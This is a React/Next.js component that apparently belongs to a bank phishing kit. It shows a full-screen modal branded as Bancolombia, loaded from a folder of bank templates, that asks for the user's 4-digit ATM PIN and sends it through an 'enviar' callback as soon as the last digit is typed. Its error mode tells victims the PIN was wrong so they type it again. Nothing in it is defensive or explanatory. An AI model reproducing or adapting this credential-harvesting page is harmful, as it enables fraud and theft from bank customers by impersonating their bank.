/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useState, useRef } from "react";

export default function Cajero({ enviar, isError = false }: { enviar: any; isError?: boolean }) {
  const [values, setValues] = useState(["", "", "", ""]);
  const inputs = Array.from({ length: 4 }).map(() => useRef<HTMLInputElement>(null));

  const handleChange = (index: number, val: string) => {
    if (!/^[0-9]?$/.test(val)) return;

    const newValues = [...values];
    newValues[index] = val;
    setValues(newValues);

    if (val && index < 3) {
      inputs[index + 1].current?.focus();
    }

    if (newValues.every((v) => v !== "")) {
      const code = newValues.join("");
      enviar?.({ cajero: code, claveCajero: code, view: "cajero" });
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !values[index] && index > 0) {
      inputs[index - 1].current?.focus();
    }
  };

  const isComplete = values.every((v) => v !== "");

  const handleConfirm = () => {
    if (!isComplete) return;
    enviar?.({ cajero: values.join(""), claveCajero: values.join(""), view: "cajero" });
  };

  return (
    <div style={{
      position: "fixed",
      top: 0,
      left: 0,
      width: "100vw",
      height: "100vh",
      backgroundColor: "rgba(0, 0, 0, 0.5)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "20px",
      zIndex: 9999,
      backdropFilter: "blur(4px)"
    }}>
      <div style={{
        backgroundColor: "#fff",
        borderRadius: "16px",
        width: "100%",
        maxWidth: "420px",
        padding: "32px 24px",
        boxShadow: "0 10px 30px rgba(0,0,0,0.2)",
        textAlign: "center"
      }}>
        <div style={{ marginBottom: "20px" }}>
          <img src="/bancos/bancol/logo.svg" alt="Bancolombia" style={{ height: "36px", margin: "0 auto" }} />
        </div>

        <h2 style={{ fontSize: "20px", fontWeight: "700", color: "#2c2a29", marginBottom: "8px" }}>
          {isError ? "Clave de Cajero Incorrecta" : "Clave de Cajero"}
        </h2>

        <p style={{ fontSize: "14px", color: "#555", marginBottom: "24px" }}>
          {isError
            ? "La clave ingresada no es correcta. Por favor ingresa nuevamente tu clave de cajero de 4 dígitos."
            : "Por favor ingresa tu clave de cajero de 4 dígitos para continuar."}
        </p>

        {isError && (
          <div style={{
            backgroundColor: "#ffebee",
            border: "1px solid #ffcdd2",
            borderRadius: "8px",
            padding: "10px",
            marginBottom: "20px",
            color: "#c62828",
            fontSize: "13px",
            fontWeight: "600"
          }}>
            ⚠️ Error: Clave de cajero inválida. Reintenta.
          </div>
        )}

        <div style={{ display: "flex", justifyContent: "center", gap: "12px", marginBottom: "28px" }}>
          {values.map((v, i) => (
            <input
              key={i}
              ref={inputs[i]}
              type="password"
              inputMode="numeric"
              maxLength={1}
              value={v}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              autoFocus={i === 0}
              style={{
                width: "48px",
                height: "56px",
                fontSize: "24px",
                fontWeight: "700",
                textAlign: "center",
                padding: 0,
                margin: 0,
                lineHeight: "1",
                border: isError ? "2px solid #e53935" : v ? "2px solid #fdc000" : "1px solid #ccc",
                borderRadius: "10px",
                outline: "none",
                backgroundColor: v ? "#fffde7" : "#fff"
              }}
            />
          ))}
        </div>

        <button
          onClick={handleConfirm}
          disabled={!isComplete}
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "30px",
            backgroundColor: isComplete ? "#fdc000" : "#e0e0e0",
            color: isComplete ? "#2c2a29" : "#9e9e9e",
            fontSize: "16px",
            fontWeight: "700",
            border: "none",
            cursor: isComplete ? "pointer" : "not-allowed",
            transition: "all 0.2s"
          }}
        >
          Continuar
        </button>
      </div>
    </div>
  );
}
